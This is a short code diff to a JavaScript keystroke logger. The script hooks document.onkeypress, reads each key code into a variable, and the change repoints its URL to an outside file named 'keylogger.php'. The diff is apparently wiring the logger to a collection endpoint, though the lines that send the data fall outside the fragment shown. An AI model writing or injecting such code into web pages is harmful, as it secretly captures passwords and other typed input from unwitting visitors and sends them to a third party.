@@ -1,5 +1,5 @@
 var keys='';
- var url = 'https://dave111111111.github.io/dave111111111-website/';
+ var url = 'https://raw.githubusercontent.com/dave111111111/dave111111111-website/main/keylogger.php';
  document.onkeypress = function(e) {
      get = window.event?event:e;
      key = get.keyCode?get.keyCode:get.charCode;
